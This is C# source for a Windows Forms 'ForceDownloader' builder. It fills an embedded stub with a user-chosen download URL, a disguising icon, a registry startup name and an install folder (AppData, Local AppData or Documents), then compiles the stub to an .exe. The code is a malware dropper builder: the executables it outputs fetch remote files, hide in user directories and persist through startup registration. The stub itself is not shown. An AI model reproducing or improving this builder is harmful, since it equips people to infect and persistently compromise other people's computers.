using System;
using System.IO;
using System.Windows.Forms;
using ForceDownloader.Properties;
namespace ForceDownloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            txtURL.Text = Settings.Default.url;
            txtIcon.Text = Settings.Default.icon;
            txtStartup.Text = Settings.Default.sname;
            cbStartup.Checked = Settings.Default.startup;
            rbAppdata.Checked = Settings.Default.appdata;
            rbLAppdata.Checked = Settings.Default.lappdata;
            rbDocs.Checked = Settings.Default.docs;
           
            
        }

        private void btnCreate_Click(object sender, EventArgs e)
        {
            SaveFileDialog save = new SaveFileDialog();
            save.Filter = "Executables | *.exe";
            if(save.ShowDialog() == DialogResult.OK)
            {
                string stub = Properties.Resources.stub;
                #region startup
                if (cbStartup.Checked)
                {
                    stub = stub.Replace("[startup-replace]", "true");
                    stub = stub.Replace("[addstart-replace]", Properties.Resources.startup);
                }
                else
                {
                    stub = stub.Replace("[startup-replace]", "false");
                    stub = stub.Replace("[addstart-replace]", "");
                }
                stub = stub.Replace("[reg-replace]", txtStartup.Text);
                #endregion
                
                
                #region save
                if (rbAppdata.Checked)
                {
                    stub = stub.Replace("[saveloc-replace]", "appdata");
                }
                if (rbLAppdata.Checked)
                {
                    stub = stub.Replace("[saveloc-replace]", "local");
                }
                if (rbDocs.Checked)
                {
                    stub = stub.Replace("[saveloc-replace]", "docs");
                }
                #endregion
                #region url
                stub = stub.Replace("[url-replace]", txtURL.Text);
                #endregion
                #region compiling
                bool done;
                if (File.Exists(txtIcon.Text))
                {
                    done = Resources.Compiler.CompileFromSource(stub, save.FileName, txtIcon.Text, null);
                }
                else
                {
                    done = Resources.Compiler.CompileFromSource(stub, save.FileName, null, null);
                }
                if (done)
                {
                    MessageBox.Show("Created!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Settings.Default.url = txtURL.Text;
                    Settings.Default.icon = txtIcon.Text;
                    Settings.Default.sname = txtStartup.Text;
                    Settings.Default.startup = cbStartup.Checked;
                    Settings.Default.appdata = rbAppdata.Checked;
                    Settings.Default.lappdata = rbLAppdata.Checked;
                    Settings.Default.docs = rbDocs.Checked;                   
                    Settings.Default.Save();
                }
                #endregion
            }
        }

       

        private void btnClose_Click(object sender, EventArgs e)
        {
            Settings.Default.url = txtURL.Text; 
            Settings.Default.icon = txtIcon.Text ;
            Settings.Default.sname = txtStartup.Text;
            Settings.Default.startup = cbStartup.Checked;
            Settings.Default.appdata = rbAppdata.Checked;
            Settings.Default.lappdata = rbLAppdata.Checked;
            Settings.Default.docs = rbDocs.Checked;            
            Settings.Default.Save();
            Environment.Exit(0);
        }

        private void btnMin_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void airFoxButton1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if(ofd.ShowDialog() == DialogResult.OK)
            {
                txtIcon.Text = ofd.FileName;
            }
        }
    }
}
